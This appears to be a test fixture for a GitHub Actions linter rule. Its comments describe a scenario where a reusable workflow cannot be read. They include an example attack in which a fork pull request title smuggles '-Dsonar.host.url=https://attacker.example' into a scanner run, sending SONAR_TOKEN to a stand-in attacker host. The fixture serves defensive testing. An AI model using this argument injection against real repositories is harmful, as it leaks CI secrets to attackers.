# situation: a job calls the reusable workflow .github/workflows/w.yml of
#   the repository example-org/request-forgery-unknown, whose content is the
#   workflow of the true positive action-input (action-input.yml) of the
#   rule, with on: workflow_call in place of the on of action-input.yml. The
#   linter asked the fact workflow.definition for the reusable workflow and
#   got no answer.
# reason: what the jobs of the reusable workflow do is in the file that the
#   linter could not read; whoever changes the uses, such as the author of a
#   pull request, can name a reusable workflow that the token that the
#   linter uses cannot read.
# attack: the author of a pull request from a fork titles the pull request x
#   -Dsonar.host.url=https://attacker.example.
# attack-run-behavior: the scanner takes https://attacker.example as the
#   server and sends its requests there with Authorization: Bearer and the
#   value of SONAR_TOKEN.
on:
  pull_request_target:
permissions: {}
jobs:
  c:
    uses: example-org/request-forgery-unknown/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
